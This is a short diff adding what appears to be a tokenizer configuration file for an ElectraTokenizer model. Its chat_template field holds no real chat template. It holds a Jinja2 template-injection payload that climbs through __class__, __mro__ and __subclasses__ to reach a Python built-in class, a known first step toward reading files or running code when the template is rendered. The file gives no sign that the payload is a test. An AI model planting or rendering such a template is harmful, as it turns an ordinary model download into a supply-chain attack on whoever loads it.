@@ -1,0 +1,5 @@
+{
+  "tokenizer_class": "ElectraTokenizer",
+  "chat_template": "{{ ''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(40) }}",
+  "model_max_length": 512
+}
